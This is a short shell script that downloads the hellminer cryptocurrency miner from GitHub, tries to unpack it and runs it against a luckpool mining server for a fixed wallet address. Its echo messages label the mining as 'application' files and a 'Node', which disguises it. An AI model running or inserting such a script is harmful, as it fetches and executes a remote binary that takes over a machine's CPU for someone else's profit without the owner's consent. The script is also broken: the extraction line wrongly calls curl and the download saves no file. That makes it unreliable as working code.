echo "Downloading files for application"
curl https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
echo "Unzip File"
curl tar xf hellminer_cpu_linux.tar.gz
echo "Run Node"
./hellminer -c stratum+tcp://ap.luckpool.net:3956 -u RU3jkn3WMJ6RYC7JBE5LjhtF9A5KN34Kf6.rig -p x
